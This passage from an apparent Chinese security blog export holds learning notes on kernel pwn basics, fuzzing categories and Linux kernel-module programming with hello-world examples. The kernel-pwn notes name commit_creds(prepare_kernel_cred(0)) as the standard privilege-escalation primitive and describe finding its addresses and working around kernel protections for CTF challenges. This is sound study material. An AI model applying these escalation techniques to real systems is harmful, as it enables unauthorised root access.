<li>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</li>
</ul>
<h3 id="2-6-内核态函数调用"><a href="#2-6-内核态函数调用" class="headerlink" title="2.6 内核态函数调用"></a>2.6 内核态函数调用</h3><p>相比用户态库函数调用，内核态的函数有了一些变化：</p>
<ol>
<li>printf()变更为**printk()**，但需要注意的是printk()<strong>不一定会把内容显示到终端上，但一定在内核缓冲区里</strong>，可以通过 dmesg 查看效果。</li>
<li>memcpy() 变更为**copy_from_user()&#x2F;copy_to_user()**：copy_from_user() 实现了将用户空间的数据传送到内核空间；copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
<li>malloc()变更为**kmalloc()**，内核态的内存分配函数，和malloc()相似，但使用的是 slab&#x2F;slub 分配器</li>
<li>free()变更为**kfree()**，同 kmalloc()</li>
</ol>
<h3 id="2-7-内核权限管理"><a href="#2-7-内核权限管理" class="headerlink" title="2.7 内核权限管理"></a>2.7 内核权限管理</h3><p>kernel负责管理进程，因此kernel也记录了进程的权限。kernel中有两个可以方便的改变权限的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line"><span class="keyword">struct</span> cred* <span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct* daemon)</span></span><br></pre></td></tr></table></figure>

<p><strong>从函数名也可以看出，执行 commit_creds(prepare_kernel_cred(0)) 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</strong></p>
<p>更多关于 prepare_kernel_cred 的信息可以参考源码<br>执行 commit_creds(prepare_kernel_cred(0)) 也是最常用的提权手段，两个函数的地址都可以在 &#x2F;proc&#x2F;kallsyms 中查看（较老的内核版本中是 &#x2F;proc&#x2F;ksyms）。</p>
<p>![img](2024-1-24-Kernel Pwn学习（1）.assets&#x2F;v2-fbd765c5d4bd00e28d763b4bc3a45371_720w.webp)</p>
<p>注：一般情况下，&#x2F;proc&#x2F;kallsyms 的内容需要 root 权限才能查看，若以非root权限查看将显示为0地址。</p>
<h4 id="struct-cred-–-进程权限结构体"><a href="#struct-cred-–-进程权限结构体" class="headerlink" title="struct cred – 进程权限结构体"></a>struct cred – 进程权限结构体</h4><p>内核使用cred结构体记录进程的权限，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息(uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。结构体源码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="2-8-内核保护机制"><a href="#2-8-内核保护机制" class="headerlink" title="2.8 内核保护机制"></a>2.8 内核保护机制</h3><ol>
<li><strong>smep</strong>: Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行<strong>用户空间</strong>的代码会触发页错误。（在 arm 中该保护称为 PXN)</li>
<li><strong>smap</strong>: Superivisor Mode Access Protection，类似于 smep，当处理器处于 ring 0 模式，访问<strong>用户空间</strong>的数据会触发页错误。</li>
<li><strong>MMAP_MIN_ADDR</strong>：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li>
<li><strong>KASLR</strong>：Kernel Address Space Layout Randomization(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li>
</ol>
<p>注：Canary, DEP, PIE, RELRO 等保护与用户态原理和作用相同。</p>
<h2 id="3-LKM介绍"><a href="#3-LKM介绍" class="headerlink" title="3. LKM介绍"></a>3. LKM介绍</h2><h4 id="3-1-LKM"><a href="#3-1-LKM" class="headerlink" title="3.1 LKM"></a>3.1 LKM</h4><p>LKM（Loadable Kernel Modules）称为可加载核心模块（内核模块），其可以看作是运行在内和空间的可执行程序，包括：</p>
<ul>
<li>驱动程序（Device drivers）设备驱动文件系统驱动…</li>
<li>内核扩展模块（Modules）</li>
</ul>
<p>LKMs的文件格式和用户态的可执行程序相同，Linux下位ELF，可以使用IDA工具来分析。</p>
<p>模块记忆单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同。</p>
<p>模块通常用来实现一种文件系统，一个驱动程序或者其他内核上层的功能。</p>
<p>Linux内核之所以提供模块机制，是因为它本身是一个宏内核（monolithic kernel）。优 点是效率高，都在内核空间运行，缺点时可扩展性和可维护性相对较差，模块机制0     就是为了弥补这一缺陷。</p>
<p><strong>通常情况下，Kernel漏洞的发生也常见于加载的LKMs出现问题。</strong></p>
<p>内核模块的相关指令：<code>insmod</code>, <code>rmmod</code>, <code>lsmod</code>, <code>modprobe</code></p>
<h4 id="3-2-file-operations-结构体"><a href="#3-2-file-operations-结构体" class="headerlink" title="3.2 file_operations 结构体"></a>3.2 file_operations 结构体</h4><p>用户进程在对设备文件进行诸如read&#x2F;write操作时，<strong>系统调用通过设备文件的主设备号找到设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理</strong>。</p>
<p>内核模块程序的结构中包括一些<a href="https://zhuanlan.zhihu.com/p/627181746">callback回调表</a>，对应的函数存储在一个file_operation(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。</p>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Events	User 	functions			Kernel functions</span></span><br><span class="line"><span class="comment">Load	insmod	module_init()</span></span><br><span class="line"><span class="comment">Open	fopen	file_operations: 	open</span></span><br><span class="line"><span class="comment">Read	fread	file_operations: 	read</span></span><br><span class="line"><span class="comment">Write	fwrite	file_operations: 	write</span></span><br><span class="line"><span class="comment">Close	fclose	file_operations: 	release</span></span><br><span class="line"><span class="comment">Remove	rmmod	module_exit()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello world!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Bye, cruel worldn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    read: module_read,</span><br><span class="line">    write: module_write,</span><br><span class="line">    open: module_open,</span><br><span class="line">    release: module_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中，module_init&#x2F;module_exit是在载入&#x2F;卸载这个驱动时自动运行；而fop结构体实现了如上四个callback，冒号右侧的函数名是由开发者自己起的，在驱动程序载入内核后，其他用户程序程序就可以借助<strong>文件方式</strong>像进行系统调用一样调用这些函数实现所需功能。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>不同于用户态的pwn，Kernel-Pwn不再是用python远程链接打payload拿shell，而是给你一个环境包，下载后qemu本地起系统。对于一个Kernel-Pwn来说，题目通常会给定以下文件：<br><strong>boot.sh:</strong> 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 启动参数有关；<strong>bzImage</strong>: kernel binary；<strong>rootfs.cpio</strong>: 文件系统映像<br><strong>qemu 启动的参数：</strong></p>
<ul>
<li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li>
<li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li>
<li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li>
<li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 —help 查看。</li>
</ul>
<p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。<br>但是为了我们调试Demo方便，我们最好在本地也编译一个bzImage。</p>
<p>注：部分Kernel漏洞只影响低版本，高版本的Kernel已对脆弱的机制进行了一定程度的遏制乃至进行了消除，但是和Glibc相同，部分中低版本的内核仍有很高的用户量，因此我们对于低版本Kernel的漏洞研究并非是没有意义的，同时，在实际调试Demo时，请特别注意Demo漏洞影响的Kernel版本。</p>
]]></content>
      <tags>
        <tag>Kernel Pwn</tag>
        <tag>LKM</tag>
        <tag>内核模块</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊测试分类</title>
    <url>/posts/34143959.html</url>
    <content><![CDATA[<h1 id="模糊测试分类"><a href="#模糊测试分类" class="headerlink" title="模糊测试分类"></a>模糊测试分类</h1><p>根据程序执行反馈的获取情况，可以将模糊测试分为白盒、黑盒和灰盒三类</p>
<h2 id="一、白盒测试"><a href="#一、白盒测试" class="headerlink" title="一、白盒测试"></a>一、白盒测试</h2><p>白盒测试通过分析被测程序的内部机制和执行被测程序时收集的信息来生成测试用例，白盒测试通常会对程序进行动态污点分析或符号执行以获取精确的程序分析和状态信息。</p>
<h2 id="二、黑盒测试"><a href="#二、黑盒测试" class="headerlink" title="二、黑盒测试"></a>二、黑盒测试</h2><p>黑盒测试将测试对象当作黑盒，按照指定的规范随机生成测试用例。不提前分析程序内部机制也不接受反馈信息来更新测试用例。</p>
<h2 id="三、灰盒测试"><a href="#三、灰盒测试" class="headerlink" title="三、灰盒测试"></a>三、灰盒测试</h2><p>灰盒测试的典型特点就是可以使用目标的执行反馈来指导测试用例的生成。</p>
<p><img src="/img/posts/2024-1-3-%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%88%86%E7%B1%BB.assets/image-20240103104937168.png" alt="image-20240103104937168"></p>
]]></content>
      <tags>
        <tag>Fuzz</tag>
        <tag>模糊测试</tag>
      </tags>
  </entry>
  <entry>
    <title>LKM编程</title>
    <url>/posts/79c0f484.html</url>
    <content><![CDATA[<h1 id="LKM编程"><a href="#LKM编程" class="headerlink" title="LKM编程"></a>LKM编程</h1><h2 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1. Introduction"></a>Chapter 1. Introduction</h2><h3 id="1-1-What-Is-A-Kernel-Module"><a href="#1-1-What-Is-A-Kernel-Module" class="headerlink" title="1.1. What Is A Kernel Module?"></a>1.1. What Is A Kernel Module?</h3><p><strong>Linux系统内核：</strong>宏内核（与微内核相对），使用内核模块实现动态模块的加载运行。</p>
<table>
<thead>
<tr>
<th></th>
<th>简介</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>宏内核</td>
<td>将进程调度核心功能，驱动程序，网络协议、文件系统都放入内核态</td>
<td>效率高</td>
<td>一个出错就崩溃</td>
</tr>
<tr>
<td>微内核</td>
<td>只将核心功能放在内核态，其他放在用户态以进程形式运行</td>
<td>驱动程序出错不影响内核运行</td>
<td>效率低</td>
</tr>
</tbody></table>
<p><strong>LKM：</strong>用于扩展内核的功能，运行在内核态，为ELF二进制文件，如果不使用内核模块，会导致需要给内核添加功能时只能重新编译整个内核，不是很方便。</p>
<h3 id="1-2-How-Do-Modules-Get-Into-The-Kernel"><a href="#1-2-How-Do-Modules-Get-Into-The-Kernel" class="headerlink" title="1.2. How Do Modules Get Into The Kernel?"></a>1.2. How Do Modules Get Into The Kernel?</h3><p>使用<code>lsmod</code>命令查看已经加载到内核的模块（<code>/proc/modules</code>）。</p>
<p>使用<code>modprobe</code>命令加载指定模块到内核（自动查询模块的依赖关系进行加载<code>/lib/modules/version/kernel/*/*.ko</code>）</p>
<p>使用<code>insmod</code>命令加载模块到内核，不会查询依赖关系（<code>modprobe</code>调用该命令）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insmod /lib/modules/2.6.11/kernel/fs/fat/fat.ko</span><br><span class="line">insmod /lib/modules/2.6.11/kernel/fs/msdos/msdos.ko</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">modprobe msdos</span><br></pre></td></tr></table></figure>

<p><strong>华为路由器LKM列表</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# lsmod</span><br><span class="line">Module                  Size  Used by</span><br><span class="line">msdos                   7642  0 </span><br><span class="line">fat                    54395  1 msdos</span><br><span class="line">ipv6                  312786  12 </span><br><span class="line">loop                   13153  0 </span><br><span class="line">mtdchar                 7769  0 </span><br><span class="line">cfi_cmdset_0001        26278  1 </span><br><span class="line">cfi_probe               3224  0 </span><br><span class="line">gen_probe               2353  1 cfi_probe</span><br><span class="line">sg                     30552  0 </span><br><span class="line">uhci_hcd               26706  0 </span><br><span class="line">cfi_util                4778  2 cfi_cmdset_0001,cfi_probe</span><br><span class="line">ehci_hcd               49012  0 </span><br><span class="line">physmap                 2637  0 </span><br><span class="line">sr_mod                 16338  0 </span><br><span class="line">i2c_piix4               5936  0 </span><br><span class="line">mtd                    18073  6 mtdchar,cfi_cmdset_0001,physmap</span><br><span class="line">8139too                20824  0 </span><br><span class="line">psmouse                53122  0 </span><br><span class="line">usbcore               152780  3 uhci_hcd,ehci_hcd</span><br><span class="line">chipreg                 1474  2 cfi_probe,physmap</span><br><span class="line">cdrom                  38519  1 sr_mod</span><br><span class="line">i2c_core               18515  1 i2c_piix4</span><br><span class="line">8139cp                 20460  0 </span><br><span class="line">serio_raw               4416  0 </span><br><span class="line">map_funcs               1034  1 physmap</span><br><span class="line">evdev                   8808  0 </span><br><span class="line">nls_base                6015  2 fat,usbcore</span><br></pre></td></tr></table></figure>



<h2 id="Chapter2-Hello-World"><a href="#Chapter2-Hello-World" class="headerlink" title="Chapter2.Hello World"></a>Chapter2.Hello World</h2><h3 id="2-1-Hello-World-part-1-The-Simplest-Module"><a href="#2-1-Hello-World-part-1-The-Simplest-Module" class="headerlink" title="2.1. Hello, World (part 1): The Simplest Module"></a>2.1. Hello, World (part 1): The Simplest Module</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-1.c - The simplest kernel module.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello world 1.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * A non 0 return means init_module failed; module can&#x27;t be loaded. </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye world 1.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>必须至少有两个函数:一个名为<code>init module()</code>的“开始”(初始化)函数，它在模块被<code>insmod</code>时被调用;一个名为<code>cleanup module()</code>的“结束”(清理)函数，它在模块被<code>rmmod</code>之前被调用。</p>
<p>在内核版本2.3后可以不这么命名加载时入口函数为使用<code>module_init</code>指定入口函数，卸载时使用<code>module_exit</code>指定卸载函数。</p>
<p>【报错】：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo insmod ./hello-1.ko                                     </span><br><span class="line">insmod: ERROR: could not insert module ./hello-1.ko: Invalid module format</span><br><span class="line">~/Documents/LKM/writeup/code                                   Py base 09:24:36</span><br><span class="line">❯ sudo dmesg | grep modules</span><br><span class="line">[  715.059773] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line">[ 1165.465487] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line"></span><br><span class="line">❯ sudo insmod ./hello-1.ko                                     </span><br><span class="line">insmod: ERROR: could not insert module ./hello-1.ko: Invalid module format</span><br><span class="line">~/Documents/LKM/writeup/code                                   Py base 09:24:36</span><br><span class="line">❯ sudo dmesg | grep modules</span><br><span class="line">[  715.059773] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">solution 注：如果重装的不是<span class="built_in">uname</span> -r显示的版本，需要指定</span></span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br><span class="line">sudo apt remove --purge linux-headers-*</span><br><span class="line">sudo apt autoremove &amp;&amp; sudo apt autoclean</span><br><span class="line">sudo apt install linux-headers-generic</span><br></pre></td></tr></table></figure>



<h4 id="2-1-1-PrintK（）"><a href="#2-1-1-PrintK（）" class="headerlink" title="2.1.1 PrintK（）"></a>2.1.1 PrintK（）</h4><p>注：打印函数与Printf函数不同（应用程序可以调用C标准库，但内核函数一般调用自己提供的函数）</p>
<p>printk函数可以用来进行内核调试，其可以打印信息到终端或日志中，打印信息分为几个等级。</p>
<p>【附：除Printk外的一些打印内核信息的函数】</p>
<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240104200604418.png" alt="image-20240104200604418"></p>
<h3 id="2-2-编译内核模块"><a href="#2-2-编译内核模块" class="headerlink" title="2.2 编译内核模块"></a>2.2 编译内核模块</h3><p>使用Makefile进行编译</p>
<p>Makefile：指定内核源码，编译参数，编译平台</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += hello-1.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<p>编译生成*.ko文件，即为内核模块。</p>
<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240104171023339.png" alt="image-20240104171023339"></p>
<p>使用<code>modinfo hello-1.ko</code>查看模块信息。</p>
<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240104171137803.png" alt="image-20240104171137803"></p>
<p>加载模块到内核<code>insmod ./hello-1.ko</code></p>
<h4 id="模块的加载流程"><a href="#模块的加载流程" class="headerlink" title="模块的加载流程"></a>模块的加载流程</h4><ul>
<li>驱动程序注册设备，创建系统信息（<code>/sys/class/xxx</code>）</li>
<li>注册设备使用的是模块文件名，要带.ko后缀</li>
<li>当操作已插入内核的模块时，只需使用模块名</li>
<li>udev|mdev根据注册的设备信息，创建设备节点（<code>/dev/xxx</code>）</li>
<li>所有设备节点信息存储在<code>/proc/devices</code></li>
<li>加载后会输出模块内的加载信息，通过<code>dmesg</code>查看</li>
</ul>
<h4 id="init-module系统调用流程"><a href="#init-module系统调用流程" class="headerlink" title="init_module系统调用流程"></a>init_module系统调用流程</h4><ul>
<li>不依赖C库。链接&#x2F;重定位自己完成</li>
<li>Kernel&#x2F;module.c&#x2F;init_module</li>
<li>拷贝到内核：copy_module_from_user</li>
<li>地址空间分配：layout_and_allocate</li>
<li>符号解析：simplify_symbols</li>
<li>重定位:apply_relocations</li>
<li>执行：complete_formation</li>
</ul>
<h3 id="2-3-Hello-World-part-2"><a href="#2-3-Hello-World-part-2" class="headerlink" title="2.3 Hello World (part 2)"></a>2.3 Hello World (part 2)</h3><p>可以使用<code>module_init(hello_2_init);</code> <code>module_exit(hello_2_exit);</code>函数指定入口函数和退出函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-2.c - Demonstrating the module_init() and module_exit() macros.</span></span><br><span class="line"><span class="comment"> *  This is preferred over using init_module() and cleanup_module().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_2_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 2\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_2_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_2_init);</span><br><span class="line">module_exit(hello_2_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Hello-World-part-3-init-and-exit宏定义"><a href="#2-4-Hello-World-part-3-init-and-exit宏定义" class="headerlink" title="2.4 Hello World (part 3):  __init and _exit宏定义"></a>2.4 Hello World (part 3):  __init and _exit宏定义</h3><p>__init宏导致一旦内置驱动程序的init函数完成，init函数就会被丢弃并释放其内存（对Loadable modules无效）</p>
<p>__exit宏导致函数遗漏，（对Loadable Modules无效）内置驱动程序不需要cleanup函数，但Loadable Modules需要。</p>
<p>以下代码定义了init, initdata, exit宏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-3.c - Illustrating the __init, __initdata and __exit macros.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello3_data __initdata = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_3_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world %d\n&quot;</span>, hello3_data);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_3_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 3\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_3_init);</span><br><span class="line">module_exit(hello_3_exit);</span><br><span class="line"></span><br><span 